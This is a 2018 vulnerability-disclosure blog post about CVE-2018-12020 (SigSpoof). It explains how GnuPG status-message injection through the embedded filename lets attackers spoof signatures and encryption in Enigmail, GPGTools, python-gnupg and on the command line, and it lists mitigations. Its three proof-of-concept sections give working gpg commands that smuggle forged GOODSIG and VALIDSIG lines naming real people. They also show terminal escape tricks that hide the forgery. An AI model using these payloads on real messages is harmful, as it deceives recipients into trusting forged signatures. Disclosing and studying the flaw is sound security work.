---
title: "SigSpoof: Spoofing signatures in GnuPG, Enigmail, GPGTools and python-gnupg (CVE-2018-12020)"
date: 2018-06-13
author: Marcus Brinkmann
menu:
  main:
    parent: Blog
tags: [legacy]
---

GnuPG, Enigmail, GPGTools and potentially other applications using
GnuPG can be attacked with in-band signaling similar to
[phreaking](https://en.wikipedia.org/wiki/Phreaking) phone lines in
the 1970s (["Cap'n
Crunch"](https://en.wikipedia.org/wiki/Cap%27n_Crunch)). We
demonstrate this by creating messages that appear to be signed by
arbitrary keys.
<!--more-->

<img class="ui centered medium rounded image" src="/images/gpg-signature-spoof/sigspoof.png">

Previously, we showed how to spoof ["encrypted"
messages](/blog/encryption-spoof) that were not actually
encrypted. This time, we spoof "signed" messages that are not
actually signed. And we show another way to spoof encryption, too.

*This work would not have been possible without the collaboration with
[Kai Michaelis](https://twitter.com/_cibo_) on
[CVE-2012-12019](/blog/enigmail-signature-spoof/) at the Bochumer
hacker space [Das Labor](https://www.das-labor.org/). [Fabian
Ising](https://twitter.com/murgi) from FH Münster verified the attack
against GPGTools, [Simon Wörner](https://github.com/SWW13) helped with
the CVE. Thanks also to all the other people who gave me guidance and
support behind the scenes!*

## tl;dr

I found a severe vulnerability in GnuPG, Enigmail, GPGTools and python-gnupg:

> [CVE-2018-12020:](https://www.cvedetails.com/cve/CVE-2018-12020) The
> signature verification routine in Enigmail 2.0.6.1, GPGTools 2018.2,
> and python-gnupg 0.4.2 parse the output of GnuPG 2.2.6 with a
> "`--status-fd 2`" option, which **allows remote attackers to spoof
> arbitrary signatures via the embedded "filename" parameter in
> OpenPGP literal data packets,** if the user has the verbose option set
> in their `gpg.conf` file.

If you are a user:

* Make sure you don't have `verbose` in `gpg.conf`.
* Do not use `gpg --verbose` on the command line.
* Upgrade to [GnuPG 2.2.8](https://gnupg.org/) or [GnuPG 1.4.23](https://lists.gnupg.org/pipermail/gnupg-announce/2018q2/000425.html)
* Upgrade to [Enigmail 2.0.7](https://sourceforge.net/p/enigmail/forum/announce/thread/b948279f/)
* Upgrade to [GPGTools 2018.3](https://gpgtools.org/)

If you are a developer:

* Add `--no-verbose` to all invocations of `gpg`.
* Upgrade to [python-gnupg 0.4.3](https://groups.google.com/forum/#!topic/python-gnupg/2yAlj_F2S1g)

<div class="ui info message">
<p>
NeoPG is not vulnerable. I removed support for embedded filenames
in <a href="https://github.com/das-labor/neopg/commit/d5726069da9c8e5194dcd0576641071bab14fe2d">Oct 12 2017</a>
because I considered it to be a dangerous and obsolete feature in
OpenPGP.
</p><p>
NeoPG wants to provide a stable and extensible programming API to make
it easier to implement OpenPGP support in applications
securely. Currently, NeoPG is unfunded. If you like
my work, you can find ways to support me at the bottom of the page!
</p>
</div>

### Identifiers

This vulnerability is tracked under the following identifiers:

* [CVE-2018-12020](https://www.cvedetails.com/cve/CVE-2018-12020)
* [DFN-CERT 2018-1113](https://twitter.com/DFNCERT_ADV/status/1006093150098604032)

Distributiuon updates for GnuPG:

* [DSA-4223-1](https://www.debian.org/security/2018/dsa-4223), [DSA-4224-1](https://www.debian.org/security/2018/dsa-4224) (Debian)
* [USN-3675-1](https://usn.ubuntu.com/3675-1/) (Ubuntu)
* [FEDORA-2018-3dc16842e2](https://bodhi.fedoraproject.org/updates/FEDORA-2018-3dc16842e2) (Fedora)
* [Suse](https://www.suse.com/de-de/security/cve/CVE-2018-12020/)

## Demonstrating the signature spoof

The screenshots below are from Enigmail and GPGTools, and apparently
show a message with a valid signature (in the first case by Patrick
Brunschwig, the Enigmail author). In reality, this message is an
encrypted message without any signature at all.

{{< load-photoswipe >}}
{{< gallery >}}
{{< figure link="/images/gpg-signature-spoof/enigmail.png" caption="Enigmail 2.0.6.1" >}}
{{< figure link="/images/gpg-signature-spoof/gpgtools.png" caption="GPGTools 2018.2" >}}
{{< /gallery >}}

## Root cause: Status message injection through embedded filename

This method relies on synergy between two unrelated weak design choices
(or oversights) in GnuPG 2.2.7 and some applications:

* Some applications call GnuPG with `--status-fd 2` such that *`stderr`
  and the status messages are combined in a single data
  pipe.* These applications try to separate the output lines afterwards
  based on the line prefix (which is `[GNUPG:]` for status messages
  and `gpg:` for `stderr`).
* GnuPG, with `verbose` enabled (either directly on the command line
  or indirectly through the `gpg.conf` configuration file), prints the
  "name of the encrypted file" (an obscure feature of OpenPGP under
  the control of the attacker) to `stderr` *without escaping newline
  characters*.

The attacker can **inject arbitrary (fake) GnuPG status messages into
the application parser to spoof signature verification and message
decryption results.** The attacker can control the key ids, algorithm
specifiers, creation times and user ids, and does not need any of the
private or public keys involved.

The only limitation is that all status messages need to fit into 255
characters, which is the limit for the "name of the encrypted file" in
OpenPGP.

## Proof of concept I: Signature spoof (Enigmail, GPGTools)

Here is how to create a message that looks signed in
Enigmail, but is not actually signed (replace `VICTIM_KEYID` by the
desired recipient):

```
$ echo 'Please send me one of those expensive washing machines.' \
| gpg --armor -r VICTIM_KEYID --encrypt --set-filename "`echo -ne \''\
\n[GNUPG:] GOODSIG DB1187B9DD5F693B Patrick Brunschwig <patrick@enigmail.net>\
\n[GNUPG:] VALIDSIG 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B 2018-05-31 1527721037 0 4 0 1 10 01 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B\
\n[GNUPG:] TRUST_FULLY 0 classic\
\ngpg: '\'`" > poc1.msg
```

Analyzing the message with GnupG (with `--verbose`) leads to the following output:

```
$ cat poc1.msg | gpg --status-fd 2 --verbose
... (lots of output snipped) ...
gpg: original file name=''
[GNUPG:] GOODSIG DB1187B9DD5F693B Patrick Brunschwig <patrick@enigmail.net>
[GNUPG:] VALIDSIG 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B 2018-05-31 1527721037 0 4 0 1 10 01 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B
[GNUPG:] TRUST_FULLY 0 classic
gpg: ''
[GNUPG:] PLAINTEXT 62 1528297411 '%0A[GNUPG:]%20GOODSIG%20DB1187B9DD5F693B%20Patrick%20Brunschwig%20<patrick@enigmail.net>%0A[GNUPG:]%20VALIDSIG%204F9F89F5505AC1D1A260631CDB1187B9DD5F693B%202018-05-31%201527721037%200%204%200%201%2010%2001%204F9F89F5505AC1D1A260631CDB1187B9DD5F693B%0A[GNUPG:]%20TRUST_FULLY%200%20classic%0Agpg:%20'
[GNUPG:] PLAINTEXT_LENGTH 56
... (more output snipped) ...
```

The application processes the output line by line:

* Lines starting with `gpg:` are ignored.
* `GOODSIG` will convince the application that the message is signed.
* `VALIDSIG` gives additional information about the signature, such as
creation time, algorithm identifiers, and the long fingerprint.
* `TRUST_FULLY` indicates that the user trusts the key. This line may
be omitted if the attacker knows that the recipient has not certified
the spoofed signing key.

Normally, GnuPG emits many more status messages for a signed message,
but applications usually do not pay much attention to those other
messages, and do not fail if these are omitted.

## Proof of concept II: Signature and Encryption spoof (Enigmail)

The attack is very powerful, and the message does not even need to be
encrypted at all. A single literal data (aka "plaintext") packet is a
perfectly valid OpenPGP message, and already contains the "name of the
encrypted file" used in the attack, even though there is no
encryption.

As a consequence, we can spoof the encryption as well. But
because we need to inject more status messages, we need to drop some
information that is unused in the application to make more space for
what is needed.

Here is an example for a message that looks signed and encrypted in
Enigmail, but it is in fact neither. We use a shorter version of
`VALIDSIG` which is compatible with an older version of GnuPG that is
still supported by Enigmail, and add just enough status messages to
spoof an encrypted message for the signature.

```
echo "See you at the secret spot tomorrow 10am." | gpg --armor --store --compress-level 0 --set-filename "`echo -ne \''\
\n[GNUPG:] GOODSIG F2AD85AC1E42B368 Patrick Brunschwig <patrick@enigmail.net>\
\n[GNUPG:] VALIDSIG F2AD85AC1E42B368 x 1527721037 0 4 0 1 10 01\
\n[GNUPG:] TRUST_FULLY\
\n[GNUPG:] BEGIN_DECRYPTION\
\n[GNUPG:] DECRYPTION_OKAY\
\n[GNUPG:] ENC_TO 50749F1E1C02AB32 1 0\
\ngpg: '\'`" > poc2.msg
```

This is how this message is displayed in Enigmail (if `verbose` is
enabled in `gpg.conf`):

<a href="/images/gpg-signature-spoof/not-signed-nor-encrypted.png"><img class="ui centered bordered image" src="/images/gpg-signature-spoof/not-signed-nor-encrypted.png"></a>

There is one advantage to this method:

* The attacker does not need the public key of the recipient, only the key id.

There are some disadvantages, too:

* The message looks more suspicious under forensic analysis. For
  example, a virus scanner could be enabled to detect this attack.
* The victim might notice that they are able to view the message
  without providing a passphrase or security token.

## Proof of concept III: Signature spoof on the command line

It is well known that email clients and other graphical user
interfaces to GnuPG provide a larger attack surface than using GnuPG
on the command line. For example, during the EFAIL vulnerability
window, the EFF recommended to use the command line to read messages
"in as safe a way as possible" on
[Linux](https://www.eff.org/de/deeplinks/2018/05/using-command-line-decrypt-message-linux),
[Windows](https://www.eff.org/de/deeplinks/2018/05/using-command-line-decrypt-message-windows)
and
[MacOS](https://www.eff.org/de/deeplinks/2018/05/using-command-line-decrypt-message-macos).

One of the few safe ways to verify signatures on the command line is
documented in the ["The GNU Privacy Handbook"](https://www.gnupg.org/gph/en/manual/x135.html):

> To verify the signature and extract the document use the `--decrypt`
> option. The signed document to verify and recover is input and the
> recovered document is output.
>
> ```
blake% gpg --output doc --decrypt doc.sig
gpg: Signature made Fri Jun  4 12:02:38 1999 CDT using DSA key ID BB7576AC
gpg: Good signature from "Alice (Judge) <alice@cyb.org>"
```

Unfortunately, the attack might even work on the command line. Here we
demonstrate how to get very close to spoofing signatures on the
command line following the recommended decryption procedure, in a way
that is portable across all operating systems and terminal types:

```
echo 'meet me at 10am' | gpg --armor --store --set-filename "`echo -ne msg\''\
\ngpg: Signature made Tue 12 Jun 2018 01:01:25 AM CEST\
\ngpg:                using RSA key 1073E74EB38BD6D19476CBF8EA9DBF9FB761A677\
\ngpg:                issuer "bill@eff.org"\
\ngpg: Good signature from "William Budington <bill@eff.org>" [full] '\''msg'`" > poc3.msg
```

When reading the message, the victim sees the following output (if `verbose` is enabled in `gpg.conf`):

```
$ gpg --output poc3.txt -d poc3.msg 
gpg: original file name='msg'
gpg: Signature made Tue 12 Jun 2018 01:01:25 AM CEST
gpg:                using RSA key 1073E74EB38BD6D19476CBF8EA9DBF9FB761A677
gpg:                issuer "bill@eff.org"
gpg: Good signature from "William Budington <bill@eff.org>" [full] 'msg'
$ cat poc3.txt
meet me at 10am
```

The result is not a perfect match to the usual (no-verbose) output,
but it is dangerously close. The main differences are:

* The first line indicates an "original file name", which is
  uncommon. But the line shown is identical to a message which
  actually has a "original file name" of `msg`.
* The last line has an extra `'msg'`, because the attacker needs to
  hide the final apostrophe output by GnuPG. This is suspicious, but
  the victim might rationalise that by correlating this to the
  `original file name` message.

A more sophisticated attack might use terminal capabilities to move
the cursor and control the output color to hide some of these
problems. This example works on terminals supporting [ANSI/VT-100
escape sequences](http://www.termsys.demon.co.uk/vtansi.htm):

```
echo 'meet me at 10am' | gpg --armor --store --set-filename "`echo -ne \''\
\rgpg: Signature made Tue 12 Jun 2018 01:01:25 AM CEST\
\ngpg:\t\t    using RSA key 1073E74EB38BD6D19476CBF8EA9DBF9FB761A677\
\ngpg:\t\t    issuer "bill@eff.org"\
\ngpg: Good signature from "William Budington <bill@eff.org>" [full]\e[200C\e[1;37m'`"
```

Here we are using several advanced tricks:

* `\r` moves the cursor back to the beginning of the "original file name" line, allowing us to overwrite it.
* `\e[200C` pushes the single apostrophe 200 characters to the right, i.e. to the end of the line.
* `\e[1;37m` makes the single apostrophe bright white (assuming the
  user's prompt will reset the color settings).

I have tried this on my standard terminal with the color scheme and
prompt I use regularly, and although the terminal does distinguish
"bright white" characters from the background color, the above
approach hides the apostrophe quite well among the smudges on my
screen:

<a href="/images/gpg-signature-spoof/apostrophe.png"><img class="ui centered bordered image" src="/images/gpg-signature-spoof/apostrophe.png"></a>

## Is `verbose` enabled?

By default, `verbose` is not enabled, but several recommended
configurations for GnuPG include it, e.g. [cooperpair sane
defaults](https://github.com/coruus/cooperpair/blob/master/saneprefs/gpg.conf),
[Ultimate GPG
Settings](https://gist.github.com/anonymous/3d928a0bcbb3ed92c454) (via
[Schneier's
Blog](https://www.schneier.com/blog/archives/2013/09/my_new_gpgpgp_a.html#c6678382))
and [Ben's
IT-Kommentare](https://blog.bmarwell.de/gnupg/einstellungen-fur-gnupg/). Export
users might be interested in the additional details that `verbose`
provides. And beginners might run into problems that require verbose
to solve.

Some applications, such as
[Evolution](https://github.com/GNOME/evolution-data-server/blob/0b17843779ee1c80479c33de532d13ca3d9da425/src/camel/camel-gpg-context.c#L603),
add `--verbose` to GnuPG invocations unconditionally, and a
forward-thinking attacker could try to submit a "helpful patch" to
Enigmail or GPGTools, adding `--verbose` to the list of
command line options "to make debugging easier."

## Impact: Vulnerable applications and libraries

We have seen how to inject arbitrary status messages into applications
using GnuPG to spoof signed and/or encrypted messages. The only
assumptions we made were:

* The application using GnuPG calls it with `--status-fd 2`, which
  causes log and status messages to be interspersed on the same output
  channel.
* The `--verbose` setting is in effect when GnuPG is called, for
  example because `verbose` is included in the user's `gpg.conf`
  configuration file for GnuPG.

We found that the following applications or libraries use `--status-fd
2` and do not use `--no-verbose`, and thus are vulnerable to the
attack if the user has `verbose` in `gpg.conf`:

* [GnuPG](https://gnupg.org/) from 0.2.2 to 2.2.7.
* [Enigmail](https://www.enigmail.net) 2.0.6.1 (and older)
* [GPGTools](https://gpgtools.org/) 2018.2 (and older)
* [python-gnupg](https://pythonhosted.org/python-gnupg/) 0.4.2 (and older)

**Any software that calls `gpg` or `gpgv` with `--status-fd 2` is
potentially affected**, unless it also adds `--no-verbose`.

## Critical infrastructure at risk

The vulnerability in GnuPG goes deep and has the potential to affect a
large part of our core infrastructure. GnuPG is not only used for
email security, but also to secure backups, software updates in
distributions, and source code in version control systems like Git.

In the course of a due diligence investigation over two weeks to
assess the impact of the vulnerability, I have found several near
misses:

* Gnome Evolution, a popular email client, uses `--verbose` by
  default, but does use a status file descriptor separate from
  `stderr`. So it is *not vulnerable* to this attack.
* Git `verify-commit` uses `--status-fd 2` to create signatures, but
  it uses `--status-fd 1` to verify (detached) signatures. Due to this
  happy circumstance it is *not vulnerable* to this attack.
* Likewise,
  [Gemato](https://github.com/mgorny/gemato/blob/master/gemato/openpgp.py#L90),
  used in Gentoo to verify package signatures, also has `--status-fd
  1` to verify detached signatures, and is *not vulnerable* to this
  attack.
* Mutt config files for GnuPG support use `--status-fd 2` and pattern
  matching, but add `--no-verbose`, too. Users with this configuration
  are *not vulnerable* to this attack.

<div class="ui warning message">
 <strong>If you use GnuPG in your application, you should verify that you are
not affected, and consider some mitigations if you are.</strong>
</div>

## Mitigations

### For Users

* Remove `verbose` from `gpg.conf`, if you have it.
* Do not use `gpg --verbose` on the command line.
* Upgrade to [GnuPG 2.2.8](https://gnupg.org/) or [GnuPG 1.4.23](https://lists.gnupg.org/pipermail/gnupg-announce/2018q2/000425.html)
* Upgrade to [Enigmail 2.0.7](https://www.enigmail.net/)
* Upgrade to [GPGTools 2018.3](https://gpgtools.org/)

### For developers

* Upgrade to [python-gnupg 0.4.3](https://groups.google.com/forum/#!topic/python-gnupg/2yAlj_F2S1g)
* Call `gpg` with `--no-verbose` to disable the attack.
* Use a dedicated pipe for `--status-fd`, and do not share it with
  `stderr`.
* If this is not easy (or even possible) due to the framework or
  target platform, consider `--batch --log-file FILE` to redirect the
  `stderr` output, where `FILE` can be `/dev/null`, too. Thanks to
  Patrick Brunschwig for this idea!
* Or, the `--status-file FILE` option could be used to direct the
  status lines to a temporary file.

### For GnuPG developers

* GnuPG should not emit the `original file name` log message (it is
  redundant with the `PLAINTEXT` status message).
* Instead of removing the log messages, GnuPG 2.2.8 at least properly
  escapes newline characters in the filename.
* GnuPG could check if `stderr` and the status fd are the same file
  descriptor, and abort operation in that case. This is a breaking
  change, but it will prevent similar problems in the future.

## Media Reaction

### 11 Jun 2018

* **heise Security**: [*Verschlüsselung: GnuPG verschärft
Integritäts-Checks*](
https://www.heise.de/security/meldung/Verschluesselung-GnuPG-verschaerft-Integritaets-Checks-4075908.html)
(Jürgen Schmidt) "Der Verfasser einer verschlüsselten E-Mail kann den
Namen der enthaltenen Dateien recht frei festlegen. GnuPG versäumte
es, die ausreichend zu checken; so konnte ein Angreifer unter anderem
Zeilenumbrüche und Steuerzeichen einbetten, die GnuPG dann mit seinen
Statusmeldungen mit ausgab. Auf diesem Weg konnte ein Angreifer einem
Programm etwa eine erfolgreiche Signaturprüfung vorgaukeln."

### 12 Jun 2018

* **The Register**: [*GnuPG patched to thwart 'fake filename' Missing
input sanitisation fixed after hacker
spat*](https://www.theregister.co.uk/2018/06/12/gnupg_patched_to_thwart_exploit/)
(Richard Chirgwin) "If you're a developer relying on GnuPG, check
upstream for an update that plugs an input sanitisation bug."

### 13 Jun 2018

* **golem.de**: [*Signaturen fälschen mit
    GnuPG*](https://www.golem.de/news/sigspoof-signaturen-faelschen-mit-gnupg-1806-134940.html)
    (Hanno Böck) "Eine Sicherheitslücke im Zusammenspiel von GnuPG und
    bestimmten Mailplugins erlaubt es unter bestimmten Umständen, die
    Signaturprüfung auszutricksen. Der Grund: Auf GnuPG aufbauende
    Tools und Mailplugins parsen die Ausgabe des Kommandozeilentools -
    und in die lassen sich unter Umständen gültig aussehende
    Statusnachrichten einschleusen."

### 14 Jun 2018

* **heise.de**: [*Enigmail und GPG Suite: Neue Mail-Plugin-Versionen
    schließen
    GnuPG-Lücke*](https://www.heise.de/security/meldung/Enigmail-und-GPG-Suite-Neue-Mail-Plugin-Versionen-schliessen-GnuPG-Luecke-4078685.html)
    (Olivia von Westernhagen) "Als Reaktion auf die "SigSpoof"-Lücke
    zum Umgehen von Signaturprüfungen gibt es neue abgesicherte
    Plugin-Versionen für gleich zwei E-Mail-Programme."
* **Ars Technica**: [*Decades-old PGP bug allowed hackers to spoof
    just about anyone’s
    signature*](https://arstechnica.com/information-technology/2018/06/decades-old-pgp-bug-allowed-hackers-to-spoof-just-about-anyones-signature/)
    (Dan Goodin) "For their entire existence, some of the world’s most
    widely used email encryption tools have been vulnerable to hacks
    that allowed attackers to spoof the digital signature of just
    about any person with a public key, a researcher said Wednesday."

### 15 Jun 2018

* **Help Net Security**: [*Vulnerability in GnuPG allowed digital
    signature spoofing for
    decades*](https://www.helpnetsecurity.com/2018/06/15/cve-2018-12020-digital-signature-spoofing/)
    (Zeljka Zorz) "A vulnerability affecting GnuPG has made some of
    the widely used email encryption software vulnerable to digital
    signature spoofing for many years."

<div style="clear: both"></div>
